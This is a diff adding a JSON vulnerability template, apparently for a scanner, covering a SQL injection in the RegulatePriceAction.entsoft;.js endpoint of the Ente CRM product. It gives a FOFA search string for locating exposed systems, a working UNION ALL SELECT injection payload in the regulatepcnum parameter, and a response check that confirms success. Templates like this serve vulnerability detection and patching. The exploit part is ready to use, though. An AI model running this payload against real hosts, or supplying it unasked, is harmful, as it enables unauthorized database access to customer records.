@@ -1,0 +1,33 @@
+{
+  "product": "浙大恩特CRM",
+  "vul_name": "浙大恩特CRM RegulatePriceAction.entsoft;.js接口存在SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "浙大恩特客户资源管理系统是一款针对企业客户资源管理的软件产品。该系统旨在帮助企业高效地管理和利用客户资源,提升销售和市场营销的效果。浙大恩特客户资源管理系统RegulatePriceAction.entsoft;.js接口存在SQL注入漏洞。该漏洞可能会对系统的完整性和安全性产生严重影响。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "title=\"欢迎使用浙大恩特客户资源管理系统\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486123&idx=1&sn=20bcfc57f151f3d39984f1a579e7e172&chksm=974b87aca03c0ebae04a1b736e04f05a1d0f3a739a41774f2b2223cab29b7b5ae7c3e7c03774&scene=178&cur_album_id=2873032428486115330#rd",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/entsoft/RegulatePriceAction.entsoft;.js?method=getRegulatePricedlist&regulatepcnum=1'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,123*123,111*1111--+aaaa"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "15129"
+        }
+      ]
+    }
+  }
+}
